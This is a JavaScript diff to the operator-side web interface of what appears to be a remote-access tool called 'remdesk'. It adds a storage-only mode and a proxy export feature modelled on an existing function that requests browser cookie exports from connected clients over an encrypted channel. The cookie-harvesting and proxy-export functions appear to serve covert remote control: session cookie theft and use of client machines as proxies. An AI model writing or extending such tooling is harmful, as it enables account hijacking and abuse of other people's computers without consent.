@@ -127,6 +127,7 @@
     panelCollapsed: false,
     textInputSupported: true,
     screenAspect: null,
+    storageOnly: false,
     remoteCursorVisible: true
   };
 
@@ -217,6 +218,11 @@
     if (desktopFlag === "1" || desktopFlag === "true" || desktopFlag === "yes" || desktopFlag === "on") {
       document.body.classList.add("desktop-mode");
     }
+    const storageOnlyFlag = (params.get("storage_only") || params.get("storageOnly") || "").toLowerCase();
+    if (storageOnlyFlag === "1" || storageOnlyFlag === "true" || storageOnlyFlag === "yes" || storageOnlyFlag === "on") {
+      document.body.classList.add("storage-only");
+      state.storageOnly = true;
+    }
     const serverUrl =
       params.get("server") ||
       params.get("server_url") ||
@@ -261,6 +267,9 @@
     const storage = (params.get("storage") || "").toLowerCase();
     state.storageAutostart =
       storage === "1" || storage === "true" || storage === "yes" || storage === "open";
+    if (state.storageOnly) {
+      state.storageAutostart = true;
+    }
 
     const streamProfile = (params.get("stream") || params.get("quality") || "").toLowerCase();
     if (streamProfile && dom.streamProfile) {
@@ -285,6 +294,13 @@
     if (payload.desktop) {
       document.body.classList.add("desktop-mode");
     }
+    if (payload.storageOnly === true) {
+      document.body.classList.add("storage-only");
+      state.storageOnly = true;
+    } else if (payload.storageOnly === false) {
+      document.body.classList.remove("storage-only");
+      state.storageOnly = false;
+    }
     const setValue = (id, value) => {
       const el = document.getElementById(id);
       if (!el) return;
@@ -299,8 +315,11 @@
     if (payload.stream && dom.streamProfile) {
       applyStreamProfile(payload.stream, false);
     }
-    if (payload.manage && dom.interactionToggle && !dom.interactionToggle.checked) {
+    if (payload.manage === true && dom.interactionToggle && !dom.interactionToggle.checked) {
       dom.interactionToggle.checked = true;
+      dom.interactionToggle.dispatchEvent(new Event("change", { bubbles: true }));
+    } else if (payload.manage === false && dom.interactionToggle && dom.interactionToggle.checked) {
+      dom.interactionToggle.checked = false;
       dom.interactionToggle.dispatchEvent(new Event("change", { bubbles: true }));
     }
     if (payload.openStorage) {
@@ -1574,6 +1593,7 @@
         scheduleStreamHint();
         startStatsMonitor();
         drainCookieQueue();
+        drainProxyQueue();
         setRemoteCursorVisibility(state.remoteCursorVisible, true);
         if (state.storageAutostart && !dom.storageDrawer.classList.contains("open")) {
           toggleStorage(true);
@@ -1738,8 +1758,9 @@
   }
 
   function toggleStorage(forceOpen) {
-    const shouldOpen =
-      typeof forceOpen === "boolean"
+    const shouldOpen = state.storageOnly
+      ? true
+      : typeof forceOpen === "boolean"
         ? forceOpen
         : !dom.storageDrawer.classList.contains("open");
     dom.storageDrawer.classList.toggle("open", shouldOpen);
@@ -1889,6 +1910,14 @@
     return `cookies_${label}_${stamp}.json`;
   }
 
+  function buildProxyFilename(clientId) {
+    const raw = String(
+      clientId || (dom.sessionIdInput ? dom.sessionIdInput.value : "") || "client"
+    ).trim();
+    const safe = raw.replace(/[^a-z0-9_-]+/gi, "_") || "client";
+    return `proxy_${safe}.txt`;
+  }
+
   async function requestCookieExport(browsers, filenameOverride) {
     if (!ensureChannelOpen()) {
       setCookieStatus("Data channel not ready", "warn");
@@ -1916,6 +1945,28 @@
     }
   }
 
+  async function requestProxyExport(clientId, filenameOverride) {
+    if (!ensureChannelOpen()) {
+      setDownloadStatus("Data channel not ready", "warn");
+      return;
+    }
+    const filename = filenameOverride || buildProxyFilename(clientId);
+    state.pendingDownload = {
+      name: filename,
+      kind: "proxy"
+    };
+    setDownloadStatus(`Exporting proxy (${filename})`, "warn");
+    try {
+      const message = await encodeOutgoing({
+        action: "export_proxy"
+      });
+      state.controlChannel.send(message);
+    } catch (error) {
+      setDownloadStatus(`E2EE error: ${error.message}`, "bad");
+      state.pendingDownload = null;
+    }
+  }
+
   function drainCookieQueue() {
     if (!state.isConnected) {
       return;
@@ -1936,8 +1987,43 @@
     });
   }
 
+  function drainProxyQueue() {
+    if (!state.isConnected) {
+      return;
+    }
+    const queue = window.__remdeskProxyQueue;
+    if (!Array.isArray(queue) || queue.length === 0) {
+      return;
+    }
+    window.__remdeskProxyQueue = [];
+    queue.forEach((entry) => {
+      if (entry && typeof entry === "object") {
+        void requestProxyExport(entry.clientId || null, entry.filename || null);
+      }
+    });
+  }
+
   window.remdeskDownloadCookies = (browsers, filename) => {
+    if (!ensureChannelOpen()) {
+      const list = Array.isArray(browsers)
+        ? browsers
+        : browsers
+          ? [browsers]
+          : [];
+      window.__remdeskCookieQueue = window.__remdeskCookieQueue || [];
+      window.__remdeskCookieQueue.push({ browsers: list, filename: filename || null });
+      return;
+    }
     void requestCookieExport(browsers, filename);
+  };
+
+  window.remdeskDownloadProxy = (clientId, filename) => {
+    if (!ensureChannelOpen()) {
+      window.__remdeskProxyQueue = window.__remdeskProxyQueue || [];
+      window.__remdeskProxyQueue.push({ clientId: clientId || null, filename: filename || null });
+      return;
+    }
+    void requestProxyExport(clientId, filename);
   };
 
   async function requestAppLaunch(appName) {
